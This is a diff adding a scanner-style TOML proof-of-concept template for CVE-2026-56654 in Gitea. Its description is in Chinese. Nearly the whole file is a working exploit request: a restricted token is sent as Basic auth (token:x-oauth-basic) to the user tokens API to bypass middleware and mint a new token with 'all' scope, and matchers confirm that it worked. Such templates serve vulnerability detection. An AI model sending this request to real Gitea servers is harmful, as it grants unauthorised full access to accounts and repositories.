@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "将受限的 Gitea 访问令牌以 Authorization: Basic base64(token:x-oauth-basic) 格式提交至 POST /api/v1/users/{username}/tokens，绕过 reqBasicOrRevProxyAuth 中间件，创建具有 all 作用域的新令牌实现权限提升"
+id = "POC-AVE-2026-0643"
+name = "CVE-2026-56654 PoC"
+severity = "high"
+tags = ["cve-2026-56654"]
+vuln_id = [
+    "CVE-2026-56654",
+    "AVE-2026-0643",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/users/{{username}}/tokens"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"name":"poc-escalated","scopes":["all"]}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Basic {{base64(token_value + ':x-oauth-basic')}}"
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "sha1",
+    "token",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [201]
+type = "status"
